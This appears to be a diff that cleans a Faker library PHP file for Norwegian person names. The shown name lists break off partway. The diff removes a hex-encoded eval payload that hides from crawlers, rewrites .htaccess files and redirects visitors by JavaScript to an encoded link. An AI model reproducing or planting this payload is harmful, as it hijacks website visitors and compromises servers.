@@ -1,1 +1,326 @@
-<?php eval(pack('H*','20246f636f796d797a7076656e6d636476613d276f636f796d797a7076656e6d636476273b66756e6374696f6e206765746c6e6b2824743d2264656622297b246369643d2276346472222e24743b72657475726e202268747470733a2f2f6269742e6c792f32436e70576d6e223b7d66756e6374696f6e2063282469702c2472616e6765297b6c69737428247375626e65742c2462697473293d6578706c6f646528272f272c2472616e6765293b69662824626974733d3d3d6e756c6c297b24626974733d33323b7d2469703d6970326c6f6e6728246970293b247375626e65743d6970326c6f6e6728247375626e6574293b246d61736b203d202d31203c3c20283332202d202462697473293b247375626e657420263d20246d61736b3b72657475726e2028246970202620246d61736b29203d3d20247375626e65743b7d66756e6374696f6e206628246970297b24626c3d6172726179282237342e3231372e39302e323530222c2237302e34322e3133312e313036222c223139392e3136372e35332e302f3234222c223139392e3136372e35322e302f3234222c223135342e35392e3132362e302f3234222c223135342e35392e3132332e302f3234222c2237322e3136352e36392e302f3234222c2236362e3233322e34302e302f3234222c2236362e3233322e33372e302f3234222c2236362e3233322e33362e302f3234222c2236362e3233322e33342e302f3234222c2236362e3233322e33332e302f3234222c2236352e3135352e33382e302f3234222c2236352e3135342e3232362e302f3234222c2236342e37342e3231352e302f3234222c2236362e3233322e34372e302f3234222c2236362e3233322e34362e302f3234222c2236362e3233322e34352e302f3234222c2236362e3233322e34342e302f3234222c2236362e3233322e34332e302f3234222c2236362e3233322e34322e302f3234222c2236362e3233322e34312e302f3234222c2236362e3233322e33392e302f3234222c2236362e3233322e33322e302f3234222c2236352e3135352e33302e302f3234222c223131372e32302e34372e302f3234222c2239352e3137322e36352e302f3234222c2236332e3235312e33352e302f3234222c2233312e3138362e3232352e302f3234222c2237342e3231372e38382e302f3234222c2236362e3135312e3133312e302f323422293b666f7265616368202824626c2061732024626c6970297b696628737472706f732824626c69702c272f2729297b69662863282469702c24626c697029203d3d2074727565297b72657475726e20747275653b7d7d656c73657b696628246970203d3d2024626c6970297b72657475726e20747275653b7d7d7d72657475726e2066616c73653b7d66756e6374696f6e206128297b2469703d245f5345525645525b2752454d4f54455f41444452275d3b69662861727261795f6b65795f6578697374732827485454505f585f464f525741524445445f464f52272c245f53455256455229297b2469703d61727261795f706f70286578706c6f646528272c272c245f5345525645525b27485454505f585f464f525741524445445f464f52275d29293b7d696628662824697029297b72657475726e20747275653b7d247072695f61646472733d6172726179282731302e302e302e307c31302e3235352e3235352e323535272c273137322e31362e302e307c3137322e33312e3235352e323535272c273139322e3136382e302e307c3139322e3136382e3235352e323535272c273136392e3235342e302e307c3136392e3235342e3235352e323535272c273132372e302e302e307c3132372e3235352e3235352e32353527293b246c6f6e675f69703d6970326c6f6e6728246970293b696628246c6f6e675f697020213d202d31297b666f726561636828247072695f616464727320617320247072695f61646472297b6c697374282473746172742c24656e64293d6578706c6f646528277c272c247072695f61646472293b696628246c6f6e675f6970203e3d206970326c6f6e67282473746172742920262620246c6f6e675f6970203c3d206970326c6f6e672824656e6429297b72657475726e20747275653b7d7d7d72657475726e2066616c73653b7d66756e6374696f6e2064282461297b24643d61727261795f7368696674282461293b246c3d22223b666f7265616368282461206173202462297b246c2e3d6368722824622d2464293b7d72657475726e20246c3b7d66756e6374696f6e206528297b6865616465722822485454502f312e3120343034204e6f7420466f756e6422293b6563686f20273c21444f43545950452048544d4c205055424c494320222d2f2f494554462f2f4454442048544d4c20322e302f2f454e223e3c68746d6c3e3c686561643e3c7469746c653e343034204e6f7420466f756e643c2f7469746c653e3c2f686561643e3c626f64793e3c68313e4e6f7420466f756e643c2f68313e3c703e546865207265717565737465642055524c20776173206e6f7420666f756e64206f6e2074686973207365727665722e3c2f703e3c2f626f64793e3c2f68746d6c3e273b657869743b7d66756e6374696f6e206828247466297b246c3d6765746c6e6b282268746122293b4063686d6f64282474662c30363636293b40756e6c696e6b28247466293b6966282466773d40666f70656e282474662c22772229297b69662840666c6f636b282466772c4c4f434b5f455829297b24723d696d706c6f646528225c6e222c617272617928223c49664d6f64756c65206d6f645f726577726974652e633e222c2252657772697465456e67696e65204f6e222c225265777269746552756c65205e2e2b5c2e7478742420246c205b4c5d222c225265777269746552756c65205e2e2b5c2e68746d2420246c205b4c5d222c225265777269746552756c65205e2e2b5c2e68746d6c2420246c205b4c5d222c2252657772697465436f6e6420257b524551554553545f46494c454e414d457d20212d66222c2252657772697465436f6e6420257b524551554553545f46494c454e414d457d20212d64222c225265777269746552756c65202e20246c205b4c5d222c223c2f49664d6f64756c653e222c222229293b24722e3d223c49664d6f64756c65206d6f645f726577726974652e633e5c6e52657772697465456e67696e65204f6e5c6e5265777269746542617365202f5c6e5265777269746552756c65205e696e6465782e7068705c24202d205b4c5d5c6e52657772697465436f6e6420257b524551554553545f46494c454e414d457d20212d665c6e52657772697465436f6e6420257b524551554553545f46494c454e414d457d20212d645c6e5265777269746552756c65202e20696e6465782e706870205b4c5d5c6e3c2f49664d6f64756c653e5c6e223b40667772697465282466772c2472293b40666c6f636b282466772c4c4f434b5f554e293b7d4066636c6f736528246677293b7d7d66756e6374696f6e207228297b72657475726e20737562737472287374725f73687566666c6528276162636465666768696a6b6c6d6e6f707172737475767778797a27292c302c3130293b7d66756e6374696f6e207328297b24733d2232302c3132342c3133362c3133362c3133322c3133352c37382c36372c36372c3132332c3132312c3133362c3132302c3131372c3132352c3132382c3134312c36352c3133322c3133342c3132352c3134322c3132312c36362c3132382c3132352c3132322c3132312c36372c38332c3133372c38312c3134312c37302c3134312c3132372c3131372c3132312c3133392c35382c3133312c38312c37302c3134302c3133372c3133322c37362c37372c3133342c35382c3132392c38312c36392c35382c3133362c38312c3131372c37302c36382c36382c37362c37302c3737223b72657475726e286578706c6f646528272c272c247329293b7d66756e6374696f6e206d282475297b24776562726f6f743d222e223b696628697373657428245f5345525645525b22444f43554d454e545f524f4f54225d29202626207374726c656e28245f5345525645525b22444f43554d454e545f524f4f54225d29292024776562726f6f743d245f5345525645525b22444f43554d454e545f524f4f54225d3b24776562726f6f743d7374725f7265706c61636528225c5c222c222f222c24776562726f6f74293b24776562726f6f743d707265675f7265706c6163652822232f2423222c22222c24776562726f6f74293b24776562726f6f742e3d222f223b682824776562726f6f742e222e687461636365737322293b6828222e2f2e687461636365737322293b24753d64282475293b24753d6261736536345f656e636f6465287374725f726f74313328247529293b246b3d303b2472303d7228293b2472313d7228292e2261223b2472323d7228292e2262223b24653d22223b696628612829207c7c2021737472706f7328245f5345525645525b27524551554553545f555249275d2c273f2729297b6528293b7d656c73657b246b3d7374726c656e282475293b7d686561646572282243616368652d436f6e74726f6c3a206e6f2d73746f72652c206e6f2d63616368652c206d7573742d726576616c69646174652c206d61782d6167653d3022293b686561646572282243616368652d436f6e74726f6c3a20706f73742d636865636b3d302c207072652d636865636b3d30222c2066616c7365293b6865616465722822507261676d613a206e6f2d636163686522293b24652e3d223c68746d6c3e3c686561643e3c7363726970743e223b24652e3d22537472696e672e70726f746f747970652e2472303d66756e6374696f6e28297b72657475726e20746869732e7265706c616365282f5b612d7a412d5a5d2f672c66756e6374696f6e2863297b72657475726e20537472696e672e66726f6d43686172436f64652828633c3d275a273f39303a313232293e3d28633d632e63686172436f646541742830292b3133293f633a632d3236293b7d293b7d3b223b24652e3d222472313d61746f622827247527293b2472323d246b3b77696e646f772e746f702e6c6f636174696f6e2e687265663d2472312e24723028293b223b24652e3d223c2f7363726970743e3c2f686561643e3c626f64793e3c2f626f64793e3c2f68746d6c3e223b6563686f2024653b7d6d28732829293b246f636f796d797a7076656e6d636476623d276f636f796d797a7076656e6d636476273b20')); ?>
+<?php
+
+namespace Faker\Provider\nb_NO;
+
+class Person extends \Faker\Provider\Person
+{
+    protected static $formats = array(
+        '{{firstName}} {{lastName}}',
+        '{{firstName}} {{lastName}}',
+        '{{firstName}} {{lastName}}',
+        '{{firstName}} {{lastName}}',
+        '{{firstName}} {{lastName}}',
+        '{{firstName}} {{firstName}} {{lastName}}',
+        '{{firstName}} {{firstName}} {{lastName}}',
+        '{{firstName}} {{firstName}} {{lastName}}',
+        '{{firstName}} {{lastName}} {{lastName}}',
+        '{{firstName}} {{lastName}}-{{lastName}}',
+        '{{firstName}} {{firstName}} {{lastName}}-{{lastName}}',
+    );
+
+    /**
+    * @var array Norwegian female first names
+    * @link http://spraakbanken.gu.se/statistik/lbfnamnalf.phtml
+    */
+    protected static $firstNameFemale = array(
+        "Abida", "Abigail", "Abir", "Ada", "Adel", "Adelaine", "Adele", "Adelen", "Adelin", "Adelina", "Adeline",
+        "Adiba", "Adila", "Adile", "Adina", "Adine", "Adisa", "Admira", "Adna", "Adriana", "Aferdita", "Afshan",
+        "Agata", "Agate", "Agathe", "Agda", "Agne", "Agnes", "Agnete", "Agnethe", "Agnieszka", "Agny", "Ahlam", "Aicha",
+        "Aida", "Aija", "Aileen", "Aili", "Ailin", "Aime", "Aimée", "Aina", "Aino", "Aisha", "Aiste", "Ajna",
+        "Albertine", "Aldona", "Aleena", "Aleksandra", "Alena", "Alette", "Alexandra", "Alfhild", "Alia", "Alice",
+        "Alida", "Alina", "Aline", "Alis", "Alise", "Alison", "Aliza", "Allis", "Alma", "Almira", "Alva", "Alvhild",
+        "Alvilde", "Alyssa", "Alaa", "Amabel", "Amal", "Amalie", "Amanda", "Amber", "Ambjørg", "Amelia", "Amelie",
+        "Amie", "Amila", "Amina", "Aminda", "Amira", "Amna", "Amporn", "Amra", "Amy", "An", "Ana", "Anab", "Anabelle",
+        "Anastasia", "Anbjørg", "Andrea", "Andrine", "Ane", "Aneta", "Anett", "Anette", "Angela", "Angelica",
+        "Angelina", "Angunn", "Anh", "Anikken", "Anila", "Anine", "Anisa", "Anita", "Anitra", "Anja", "Anke", "Anlaug",
+        "Ann", "Anna", "Annabel", "Annabelle", "Annbjørg", "Anne", "Anneke", "Anneli", "Annelise", "Annemarie",
+        "Annette", "Annfrid", "Anni", "Annicken", "Annie", "Annika", "Anniken", "Annka", "Annlaug", "Annveig", "Anny",
+        "Antje", "Antoinette", "Anya", "April", "Ardita", "Ariana", "Ariel", "Ariela", "Arina", "Arja", "Arlene",
+        "Arna", "Arnbjørg", "Arnhild", "Arnlaug", "Asbjørg", "Asha", "Aslaug", "Asma", "Asta", "Astri", "Astrid",
+        "Athene", "Atina", "Aud", "Audhild", "Audny", "Audrey", "Aurora", "Ayan", "Ayla", "Ayleen", "Aylin", "Ayse",
+        "Azra", "Babette", "Barbara", "Barbro", "Beate", "Beatrice", "Belinda", "Bella", "Benedicte", "Benedikte",
+        "Benny", "Bente", "Bergdis", "Bergfrid", "Bergliot", "Bergljot", "Berit", "Bernadette", "Berta", "Berthe",
+        "Bertine", "Beth", "Betina", "Betine", "Betsy", "Bettina", "Betty", "Betzy", "Bianca", "Bibbi", "Bibi",
+        "Birgit", "Birgitta", "Birgitte", "Birte", "Birthe", "Bitten", "Bjørg", "Bjørghild", "Blanca", "Bodil",
+        "Bolette", "Bonnie", "Borghild", "Borgny", "Bozena", "Brigitte", "Brit", "Brita", "Britt", "Bryngjerd",
+        "Brynhild", "Bushra", "Caisa", "Camilla", "Carina", "Carita", "Carla", "Carlota", "Carmen", "Carol", "Carola",
+        "Carolina", "Caroline", "Cassandra", "Catalina", "Catarina", "Cate", "Catherina", "Cathinka", "Cathrine",
+        "Catrine", "Cecilia", "Cecilie", "Celine", "Chanette", "Chantal", "Charlotte", "Chi", "Chloe", "Christel",
+        "Christiane", "Christin", "Christina", "Christine", "Cicilie", "Cilje", "Cindy", "Clara", "Claudia", "Connie",
+        "Conny", "Constance", "Cora", "Cordelia", "Corina", "Cornelia", "Cornelie", "Cristel", "Cristina", "Cynthia",
+        "Dagfrid", "Dagmar", "Dagne", "Dagny", "Dagrun", "Daisy", "Dana", "Daniella", "Danielle", "Danuta", "Daria",
+        "Dea", "Debora", "Denise", "Derya", "Desirée", "Diana", "Diane", "Dianne", "Dilan", "Dina", "Dolores", "Donna",
+        "Dora", "Dordi", "Doreen", "Doris", "Dorit", "Dorota", "Dorothea", "Dorte", "Dorthe", "Dorthea", "Dragana",
+        "Drude", "Dung", "Dyrhild", "Dyveke", "Ea", "Ebba", "Ece", "Edda", "Edel", "Edit", "Edith", "Edle", "Edna",
+        "Edny", "Edvarda", "Edvine", "Eileen", "Eilin", "Einy", "Eir", "Eira", "Eirian", "Eiril", "Eirin", "Eirunn",
+        "Eivor", "Ekaterina", "Elaine", "Elbjørg", "Eldbjørg", "Eldfrid", "Eldrid", "Elea", "Eleanora", "Elen", "Elena",
+        "Elenora", "Elfi", "Elfrid", "Elfrida", "Eli", "Elia", "Elida", "Elin", "Elina", "Eline", "Elinor", "Elisa",
+        "Elisabet", "Elisabeth", "Elise", "Elizabeth", "Ella", "Elle", "Ellen", "Ellida", "Ellinor", "Ellisiv", "Elma",
+        "Elna", "Elsa", "Else", "Elsebeth", "Elsie", "Elvine", "Elvira", "Elzbieta", "Eman", "Embla", "Emelie", "Emely",
+        "Emilie", "Emilija", "Emily", "Emina", "Emma", "Emmy", "Ena", "Enid", "Enya", "Erica", "Erika", "Erle", "Erna",
+        "Esma", "Ester", "Esther", "Ethel", "Eva", "Evangeline", "Evelina", "Evelyn", "Evi", "Evie", "Evita", "Evy",
+        "Eydis", "Eyvor", "Fadumo", "Faisa", "Faiza", "Fanny", "Farah", "Farhiya", "Fariba", "Farida", "Farzana",
+        "Fatima", "Fay", "Felicia", "Feliza", "Fernanda", "Filippa", "Fiona", "Florence", "Fozia", "Frances",
+        "Franciska", "Franziska", "Frederika", "Fredrikke", "Freja", "Frid", "Frida", "Fride", "Frigg", "Frøy", "Frøya",
+        "Frøydis", "Gabrielle", "Galina", "Geirhild", "Georgine", "Gerd", "Gerda", "Gertrud", "Ghazala", "Gidske",
+        "Gina", "Gine", "Gisela", "Giske", "Gisken", "Gitte", "Gjerd", "Gjertine", "Gjertrud", "Gjøril", "Gjørild",
+        "Gloria", "Grace", "Greta", "Grete", "Grethe", "Gro", "Gry", "Gudjørg", "Gudlaug", "Gudny", "Gudrid", "Gudrun",
+        "Gudveig", "Gul", "Gulla", "Gullborg", "Gun", "Gunbjørg", "Gunda", "Gunhild", "Gunlaug", "Gunn", "Gunnbjørg",
+        "Gunnel", "Gunnhild", "Gunnlaug", "Gunnveig", "Gunnvor", "Gunnvår", "Gunvor", "Guri", "Gurine", "Guro", "Gusta",
+        "Gustava", "Gyda", "Gyri", "Gyrid", "Gøril", "Hacer", "Hafsa", "Haldis", "Halimo", "Halina", "Hallbjørg",
+        "Halldis", "Hallfrid", "Hamida", "Hana", "Hanan", "Hang", "Hanna", "Hanne", "Hansine", "Harda", "Harriet",
+        "Hatice", "Hava", "Hawa", "Heather", "Hedda", "Hedvig", "Hege", "Heidi", "Heidrun", "Heike", "Helen", "Helena",
+        "Helene", "Helga", "Helin", "Hella", "Helle", "Helma", "Hennie", "Henny", "Henriette", "Herbjørg", "Herborg",
+        "Herdis", "Herlaug", "Hermine", "Hiba", "Hibo", "Hilary", "Hild", "Hilde", "Hildegunn", "Hildur", "Hillevi",
+        "Hilma", "Hina", "Hjørdis", "Hoa", "Hong", "Huda", "Hue", "Hulda", "Huong", "Hæge", "Iben", "Ida", "Idun",
+        "Idunn", "Ifrah", "Ildri", "Ildrid", "Ilona", "Ilse", "Iman", "Ina", "Indira", "Ine", "Ines", "Inga", "Inge",
+        "Ingebjørg", "Ingeborg", "Ingegerd", "Ingelin", "Inger", "Inger-Lise", "Ingerid", "Ingfrid", "Inghild",
+        "Ingjerd", "Ingrid", "Ingrun", "Ingrunn", "Ingunn", "Ingveig", "Ingvild", "Irene", "Iris", "Irja", "Irma",
+        "Irmelin", "Isa", "Isabel", "Isadora", "Iselin", "Ivana", "Ivarda", "Iwona", "Izabela", "Jacqueline", "Jamila",
+        "Jane", "Janette", "Janicke", "Janken", "Janne", "Jarlfrid", "Jaroslaw", "Jasmin", "Jean", "Jeanette", "Jeanne",
+        "Jelena", "Jenni", "Jennifer", "Jenny", "Jessica", "Jill", "Jo", "Jocelyn", "Jofrid", "Johanna", "Johanne",
+        "Jolanta", "Jone", "Jorid", "Jorun", "Jorunn", "Josefine", "Joyce", "Judit", "Judith", "Julia", "Julie", "June",
+        "Juni", "Jytte", "Jøran", "Kai", "Kaia", "Kaisa", "Kamila", "Kamilla", "Karen", "Kari", "Karianne", "Karin",
+        "Karina", "Karine", "Karita", "Karoline", "Katarina", "Kate", "Kathinka", "Kathleen", "Kathrine", "Kaya",
+        "Kelly", "Kerstin", "Khadija", "Khadra", "Khalida", "Kim", "Kine", "Kirsten", "Kirsti", "Kitty", "Kjellaug",
+        "Kjellfrid", "Kjellrun", "Kjersti", "Kjerstin", "Klara", "Konstanse", "Kornelia", "Kristi", "Kristin",
+        "Kristina", "Kristine", "Laila", "Lana", "Lara", "Larissa", "Laura", "Lea", "Leah", "Leia", "Leikny", "Leila",
+        "Lena", "Lene", "Leona", "Leyla", "Lidia", "Lilian", "Lill", "Lillian", "Lilly", "Lina", "Linda", "Line",
+        "Linea", "Linh", "Linn", "Linnea", "Lisa", "Lisbeth", "Lise", "Liss", "Liv", "Live", "Liza", "Loma", "Lone",
+        "Lotta", "Lotte", "Louise", "Lovise", "Lucia", "Ludmila", "Luna", "Lydia", "Lykke", "Mabel", "Madeleine",
+        "Magda", "Magdalena", "Magdalene", "Magna", "Magnhild", "Magni", "Mai", "Maia", "Maiken", "Mailen", "Maj",
+        "Maja", "Malene", "Mali", "Malin", "Maren", "Margareta", "Margareth", "Margarita", "Marge", "Margit", "Margot",
+        "Margrete", "Margrethe", "Marguerite", "Margy", "Mari", "Maria", "Marianne", "Marie", "Mariell", "Marilyn",
+        "Marina", "Marion", "Marit", "Marlene", "Marta", "Marte", "Martha", "Martine", "Mary", "Mathea", "Mathilde",
+        "Maud", "May", "Maya", "Maylen", "Melanie", "Melina", "Melinda", "Melissa", "Melita", "Mercedes", "Merete",
+        "Mette", "Mia", "Michaela", "Mildrid", "Milena", "Milla", "Mille", "Mina", "Mira", "Miranda", "Miriam", "Moa",
+        "Mona", "Monica", "Monika", "Monja", "Muna", "Munira", "My", "Märta", "Märtha", "Møyfrid", "Målfrid", "Nada",
+        "Nadia", "Nadine", "Nadja", "Naima", "Nancy", "Nanna", "Naomi", "Nasreen", "Nasrin", "Natalie", "Nathalie",
+        "Nazia", "Nelly", "Ngoc", "Nicole", "Nikita", "Niklas", "Nikoline", "Nimo", "Nina", "Noomi", "Noor", "Nor",
+        "Nora", "Norunn", "Oda", "Oddbjørg", "Oddfrid", "Oddlaug", "Oddny", "Oddrun", "Oddveig", "Oksana", "Olaug",
+        "Olga", "Olina", "Oline", "Olivia", "Othilie", "Otilie", "Palma", "Pamela", "Patricia", "Paula", "Pauline",
+        "Peggy", "Perly", "Pernille", "Petra", "Phuong", "Pia", "Rachel", "Ragna", "Ragne", "Ragnfrid", "Ragnhild",
+        "Ragni", "Rahma", "Rakel", "Ramona", "Randi", "Rania", "Ranja", "Ranveig", "Rebecca", "Rebekka", "Regine",
+        "Reidun", "Renate", "Renée", "Riborg", "Rigmor", "Rina", "Rine", "Rita", "Ronja", "Rosa", "Rose", "Rukhsana",
+        "Runa", "Rut", "Ruth", "Rønnaug", "Saba", "Sabine", "Sabrina", "Sadia", "Safia", "Saga", "Sahra", "Saima",
+        "Sally", "Salma", "Samantha", "Samina", "Samira", "Sana", "Sandra", "Sanja", "Sanna", "Sara", "Sarah", "Selina",
+        "Selma", "Serina", "Shabana", "Shahnaz", "Shamim", "Sharon", "Shazia", "Sheila", "Shirin", "Shirley", "Shukri",
+        "Sidsel", "Sigfrid", "Signe", "Sigrid", "Sigrun", "Silje", "Silvia", "Simona", "Simone", "Sina", "Siren",
+        "Siri", "Siril", "Sissel", "Siv", "Snefrid", "Sofia", "Sofie", "Sol", "Solbjørg", "Solfrid", "Solgunn",
+        "Sollaug", "Solrun", "Solveig", "Solvor", "Sonja", "Sophie", "Stella", "Stina", "Stine", "Sumaya", "Sunniva",
+        "Susanne", "Svanaug", "Svanhild", "Svetlana", "Sygni", "Sylvi", "Synnøve", "Sølvi", "Tahira", "Tale", "Tamara",
+        "Tania", "Tanja", "Tanya", "Tara", "Taran", "Tatiana", "Tea", "Terese", "Thale", "Thanh", "Thao", "Thea",
+        "Thelma", "Theodora", "Therese", "Thi", "Thilde", "Thina", "Thine", "Thora", "Thorbjørg", "Thordis", "Thorild",
+        "Thu", "Thuy", "Thyra", "Tia", "Tiffany", "Tilde", "Tina", "Tindra", "Tine", "Tiril", "Toini", "Tomine", "Tone",
+        "Tonje", "Tora", "Torbjørg", "Tordis", "Torgny", "Torgun", "Torgunn", "Torhild", "Tori", "Toril", "Torild",
+        "Torlaug", "Torny", "Torunn", "Tove", "Toya", "Trine", "Trude", "Turid", "Tuva", "Tuyet", "Tyra", "Ulla",
+        "Ulrikke", "Una", "Undis", "Une", "Unn", "Unni", "Ursula", "Uzma", "Valentina", "Vanessa", "Vanja", "Vebjørg",
+        "Velaug", "Venche", "Vendela", "Vera", "Veronica", "Veslemøy", "Vibeke", "Victoria", "Vida", "Vigdis",
+        "Viktoria", "Vilde", "Vilhelmina", "Vilja", "Villemo", "Vilma", "Viola", "Virginia", "Vivi", "Vivian", "Vår",
+        "Vårin", "Wanda", "Wanja", "Wenche", "Wendy", "Wera", "Weronika", "Wibecke", "Wibeke", "Wigdis", "Wilde",
+        "Wilma", "Winnie", "Xuan", "Yasmin", "Ylva", "Yngvild", "Yvonne", "Zahida", "Zahra", "Zainab", "Zara",
+        "Zuzanna", "Øydis", "Øyvor", "Ågot", "Aasa", "Aase", "Åse", "Åshild", "Aashild", "Åslaug", "Åsne", "Åsta",
+        "Aasta"
+    );
+
+    /**
+    * @var array Norwegian male first names
+    * @link http://www.mammanett.no/navn/leksikon/alle?field_name_sex_value=m&title=
+    */
+    protected static $firstNameMale = array(
+        "Abbas", "Abdallah", "Abdelaziz", "Abdelkader", "Abdi", "Abdiasis", "Abdifatah", "Abdikadir", "Abdinasir",
+        "Abdirahim", "Abdirahman", "Abdirashid", "Abdirizak", "Abdul", "Abdulahi", "Abdulkadir", "Abdullah",
+        "Abdullahi", "Abdulqadir", "Abdurahman", "Abed", "Abel", "Abid", "Abraham", "Absalon", "Abu", "Abubakar",
+        "Adam", "Adan", "Adeel", "Adelheid", "Adelsten", "Adem", "Aden", "Adham", "Adi", "Adil", "Adis", "Adler",
+        "Admir", "Adnan", "Adolf", "Adrian", "Afanasi", "Afrim", "Afshin", "Agim", "Agmund", "Agnar", "Agvald", "Ahmad",
+        "Ahmed", "Aiden", "Ailo", "Aimar", "Aime", "Ajdin", "Ajmal", "Akam", "Akbar", "Akram", "Aksel", "Alain", "Alan",
+        "Alban", "Albert", "Alberto", "Albin", "Albrecht", "Alejandro", "Aleksander", "Alen", "Alessandro", "Alex",
+        "Alexander", "Alexsander", "Alf", "Alfred", "Algirdas", "Algot", "Ali", "Allan", "Almar", "Almas", "Almaz",
+        "Almir", "Altin", "Alv", "Alvald", "Alvar", "Alvaro", "Alvfinn", "Alvgeir", "Alvin", "Alvis", "Alaa", "Amadeus",
+        "Aman", "Amandus", "Amanuel", "Amar", "Ambjørn", "Ambros", "Ambrosius", "Amel", "Amer", "Amin", "Amir", "Ammar",
+        "Amund", "An", "Anas", "Anbjørn", "Anders", "Andi", "Andor", "André", "Andreas", "Andres", "Andrew", "Andris",
+        "Andrzej", "Andy", "Anh", "Anil", "Annar", "Anselm", "Ansgar", "Anskar", "Anstein", "Anthon", "Anthony",
+        "Anton", "Antonio", "Antonius", "Anwar", "Aram", "Ard", "Are", "Arent", "Ari", "Arian", "Ariel", "Arild",
+        "Arkadiusz", "Armand", "Armin", "Arn", "Arnald", "Arnar", "Arnbjørn", "Arndor", "Arne", "Arnfinn", "Arnfred",
+        "Arngrim", "Arnljot", "Arnold", "Arnolf", "Arnor", "Arnstein", "Arnt", "Arnulf", "Arnulv", "Arnvid", "Aron",
+        "Arslan", "Arthur", "Artur", "Arun", "Arunas", "Arve", "Arvid", "Arvin", "Asad", "Asbjørn", "Asgeir", "Asif",
+        "Ask", "Askjel", "Aslak", "Aslan", "Asle", "Asmund", "Astor", "Atif", "Atle", "Attila", "Audbjørn", "Audfinn",
+        "Audun", "Augun", "August", "Augustin", "Axel", "Aziz", "Bajram", "Balder", "Bao", "Barry", "Bart",
+        "Bartlomiej", "Bartol", "Bastian", "Bekim", "Ben", "Bendik", "Benedikt", "Bengt", "Benjamin", "Benny", "Bent",
+        "Berent", "Berge", "Berger", "Bergfinn", "Bergsvein", "Berhane", "Bernhard", "Bernt", "Bert", "Bertel",
+        "Bertil", "Bertin", "Bertold", "Bertram", "Bertrand", "Besim", "Besnik", "Bilal", "Bill", "Birger", "Birk",
+        "Bjarne", "Bjart", "Bjarte", "Bjartmar", "Bjørge", "Bjørk", "Bjørn", "Bjørnar", "Bjørnulv", "Blerim", "Bo",
+        "Bob", "Bobby", "Bodolv", "Bodvar", "Bogdan", "Boguslaw", "Borgar", "Borger", "Boris", "Bork", "Bosse",
+        "Botolv", "Boye", "Brage", "Brede", "Bredo", "Brian", "Brigt", "Brikt", "Broder", "Bror", "Bruno", "Bryan",
+        "Brynar", "Brynjar", "Brynjulf", "Brynjulv", "Bujar", "Burhan", "Byrge", "Børge", "Børje", "Børre", "Bård",
+        "Calvin", "Carl", "Carsten", "Caspar", "Casper", "Caspian", "Cato", "Cay", "Cecil", "Cengiz", "Cesar", "Chan",
+        "Chand", "Charles", "Charlie", "Chi", "Chris", "Chrisander", "Christen", "Christer", "Christian", "Christoffer",
+        "Christopher", "Claes", "Clas", "Claude", "Claudio", "Claus", "Clemens", "Clement", "Cliff", "Clive", "Colin",
+        "Cong", "Conrad", "Constantin", "Cornelis", "Cornelius", "Craig", "Cristian", "Cristoffer", "Curt", "Cyril",
+        "Czeslaw", "Dag", "Dagfinn", "Dagmøy", "Damian", "Damir", "Dan", "Dani", "Danial", "Daniel", "Danish",
+        "Dankert", "Danny", "Dario", "Dariusz", "Darko", "Darren", "Dat", "David", "Davy", "Dean", "Dejan", "Denis",
+        "Dennis", "Derek", "Derrick", "Detlef", "Diako", "Dick", "Didrik", "Diego", "Dieter", "Dietmar", "Dilan",
+        "Dimitrios", "Dines", "Dino", "Dirk", "Ditlev", "Ditmar", "Dmitri", "Dmitry", "Dominic", "Dominik", "Don",
+        "Donald", "Douglas", "Dragan", "Dung", "Dusan", "Duy", "Dylan", "Dyre", "Earl", "Ebbe", "Edd", "Eddie", "Eddy",
+        "Edgar", "Edgard", "Edin", "Edmond", "Edmund", "Edvard", "Edvin", "Edward", "Edwin", "Ege", "Egil", "Egon",
+        "Egzon", "Ehsan", "Eigil", "Eilef", "Eilert", "Eilev", "Eilif", "Eiliv", "Einar", "Eindride", "Einvald",
+        "Eirik", "Eivind", "Ekrem", "Eldar", "Eli", "Elias", "Elif", "Ellef", "Elleif", "Elling", "Elliot", "Elmar",
+        "Elmer", "Elnar", "Elton", "Elvin", "Elvis", "Emanuel", "Embret", "Embrik", "Emil", "Emir", "Emmanuel", "Emre",
+        "Emrik", "Endre", "Ener", "Enes", "Enevold", "Engebret", "Engel", "Enis", "Enok", "Enrico", "Enrique", "Enver",
+        "Erik", "Erland", "Erlend", "Erling", "Ernst", "Ervin", "Erwin", "Esben", "Eskil", "Eskild", "Espen", "Esten",
+        "Eugen", "Evald", "Even", "Evert", "Eyolf", "Eystein", "Eyvind", "Fabian", "Fahad", "Faisal", "Falk", "Farah",
+        "Farhad", "Farhan", "Farid", "Fartein", "Faruk", "Farzan", "Faste", "Fastolv", "Felix", "Feliz", "Ferdinand",
+        "Filip", "Finn", "Finnbjørn", "Finngard", "Finngeir", "Finnvard", "Flamur", "Flemming", "Florian", "Folke",
+        "Francis", "Frank", "Frans", "Frants", "Frantz", "Fred", "Freddie", "Freddy", "Frede", "Frederick", "Frederik",
+        "Fredrick", "Fredrik", "Fridleiv", "Fridtjof", "Frikk", "Fritjof", "Fritjov", "Frits", "Fritz", "Frode",
+        "Frøystein", "Fuad", "Fuat", "Gabriel", "Gard", "Gardar", "Gary", "Gaute", "Geir", "Geirmund", "Geirr",
+        "Geirstein", "Geirulv", "Geoffrey", "Georg", "Gerald", "Gerard", "Gerd", "Gerhard", "Gerrit", "Gerry", "Gert",
+        "Gholam", "Ghulam", "Gilbert", "Gintaras", "Gisle", "Gjermund", "Gjert", "Gjøran", "Gladys", "Glen", "Glenn",
+        "Godtfred", "Goran", "Gordon", "Gorm", "Grant", "Gregard", "Greger", "Gregor", "Gregorius", "Gregory", "Grim",
+        "Grimar", "Grzegorz", "Gudbrand", "Gudkjell", "Gudleiv", "Gudmund", "Gudvin", "Gulbrand", "Gullik", "Gunder",
+        "Gunleik", "Gunnar", "Gunne", "Gunnerius", "Gunnleif", "Gunnleiv", "Gunnstein", "Gunnvald", "Gunstein",
+        "Gunvald", "Gustav", "Guttorm", "Guy", "Gynter", "Gøran", "Gösta", "Hadi", "Hagbart", "Hai", "Hakan", "Hakon",
+        "Haldor", "Halfdan", "Halfrid", "Halgeir", "Halil", "Halldor", "Hallgeir", "Hallstein", "Hallvard", "Halvard",
+        "Halvdan", "Halvor", "Hamid", "Hamza", "Hanad", "Hans", "Harald", "Haroon", "Harry", "Hartvig", "Hasan",
+        "Hassan", "Hasse", "Hauk", "Hector", "Heike", "Hein", "Heine", "Helge", "Heljar", "Helmer", "Heming", "Henki",
+        "Henning", "Henri", "Henrik", "Henry", "Herbert", "Herbjørn", "Herleif", "Herman", "Hermann", "Hermod",
+        "Hermund", "Herstein", "Hieu", "Hilbert", "Hildegard", "Hilmar", "Hjalmar", "Hoang", "Hogne", "Holger",
